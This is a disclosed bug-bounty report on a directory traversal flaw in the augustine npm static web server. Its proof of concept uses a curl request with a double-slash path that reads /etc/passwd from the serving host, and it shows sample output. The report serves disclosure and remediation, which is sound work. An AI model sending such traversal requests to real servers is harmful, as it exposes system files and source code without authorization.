# [augustine] Static Web Server Directory Traversal via Crafted GET Request

## Report Details
- **Report ID**: 296282
- **URL**: https://hackerone.com/reports/296282
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-12-08T14:35:46.647Z
- **Disclosed**: 2018-01-23T09:53:11.566Z

## Reporter
- **Username**: ysx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi,

A crafted GET request can be leveraged to traverse the directory structure of a host using the `augustine` web server package, and request arbitrary files outside of the specified web root.

## Module specification
* **Name**: [augustine](https://www.npmjs.com/package/augustine)
* **Version**: 0.2.3 (latest release build)

## Verified conditions
* **Test server:** Ubuntu 16.04 LTS
* **cURL package**: `curl 7.55.1 (2017-08-14)`

## Proof of concept

Please globally install the `augustine` package and `cd` to a chosen directory (in this case, `/root`) on your test server. Next, run `augustine --port 8081` to start serving from this location.

Substituting the `<server-IP>` value as appropriate, the following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file. Due to the nature of this traversal, browsing to the below URL will also display the `passwd` file:

```
curl "http://<server-IP>:8081//etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.

## Attachments
No attachments
